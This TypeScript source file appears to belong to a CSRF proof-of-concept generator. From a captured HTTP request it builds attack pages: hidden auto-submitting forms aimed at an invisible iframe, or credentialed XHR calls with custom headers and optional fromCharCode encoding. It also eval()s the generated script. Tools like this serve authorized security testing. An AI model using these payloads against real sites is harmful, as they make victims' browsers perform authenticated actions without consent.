interface sendfunc {
    generate(httprequest: HTTPRequest): boolean;

    generateHTML(title: string, bodyhtml: string): string;

    send(): boolean;

    generateSendFunction(): string;
}

const formfunc = {
    generate(httpRequest: HTTPRequest): boolean {
        const req = httpRequest.line;
        if (req === false) return false;
        req['enctype'] = form.getEnctype();
        let ezhtml: string = "";
        let transsub = "";
        if (!form.isTransitionSubmit()) transsub = 'target="dummyfrm"';
        ezhtml += `<form ${transsub} name="evilform" action="${req['url']}" method="${req['method']}" enctype="${req['enctype']}">
`;
        const params = httpRequest.body;
        for (let i = 0; i < params.length; i++) {
            ezhtml += HTMLRender.input(URLdecode(params[i][0]), URLdecode(params[i][1]), ((!form.isAutoSubmit() && form.isSpecifiable()) ? ("text") : ("hidden"))) + "\n";
        }
        ezhtml += `</form>
<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>`;
        setEvilHTMLContent(ezhtml);

        setEvilTextContent(ezhtml);
        errorMsg("");
        return true;
    },

    generateHTML(title: string, bodyhtml): string {
        let content: string =
            `${getHTMLheader(title)}
<body${(form.isAutoSubmit()) ? ' onload="csrfSubmit();"' : ''}>
${bodyhtml}${(!form.isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
${this.generateSendFunction()}
<p>${title}</p>
${getHTMLfooter()}
`;
        return content;
    },

    send(httprequest: HTTPRequest): boolean {
        const req = httprequest;
        if (form.isTransitionSubmit()) {
            errorMsg("Cannot submit because \"transition on submit\" is on!");
            return false;
        }
        if (!isValidURL(req.line['url'])) {
            errorMsg("The URL is malformed");
            return false;
        }
        document.getElementById("stat").innerHTML += `<p>${new Date().toLocaleString()} Request sent.</p><p>${escapeHTML(req.line['url'])}</p><p>${escapeHTML(req.rawBody)}</p><hr />`;
        // @ts-ignore
        const submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
        submit(); // submit request.
        errorMsg("");
        return true;
    },

    generateSendFunction(): string {
        let content = `<script>
function csrfSubmit(){
    let submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
    submit();
}
</script>
`;
        return content;
    }
};

const xhrfunc = {
    generate: function (httpRequest: HTTPRequest) {
        const req = httpRequest.line;
        const enctype: string = HTTPRequest.buildHeaderOption(httpRequest.enctype);
        const headers = httpRequest.header;
        const sendMessage = (form.isFromCharCode() ? toFromCharCodes(form.getBody()) : "'" + escapeJavascript(form.getBody()) + "'");
        let ezhtml: string =
            `function csrfSubmit(){
let xhr=new XMLHttpRequest();
xhr.open('${req['method']}','${req['url']}');
xhr.withCredentials = true;
`;
        const hc = headers['custom'];
        for (let i = 0; i < hc.length; i++) {
            ezhtml += `xhr.setRequestHeader('${hc[i][0]}','${HTTPRequest.buildHeaderOption(hc[i][1])}');
`;
        }
        if (enctype !== '') ezhtml += `xhr.setRequestHeader('Content-Type','${enctype}')
        `;
        ezhtml += `xhr.send(${sendMessage});
}
`;
        setEvilTextContent(ezhtml, true);
        setEvilHTMLContent(ezhtml);
        return true;
    },

    generateHTML: function (title: string, bodyhtml: string) {
        let content: string =
            `${getHTMLheader(title)}
<body${(form.isAutoSubmit()) ? ' onload="csrfSubmit();"' : ''}>
${bodyhtml}${(!form.isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : ''}
<p>${title}</p>
${getHTMLfooter()}
`;
        return content;
    },

    send: function () {
        eval(document.getElementById("evilzone").textContent);
        // @ts-ignore
        csrfSubmit();
    }
};

function getHTMLheader(title = "CSRF PoC") {
    let content = `<!DOCTYPE html>

<html>
<head>
<meta charset="utf-8">
<title>${title}</title>
</head>
`;
    return content;
}

function getHTMLfooter() {
    let content = '</html>\n';
    return content;
}
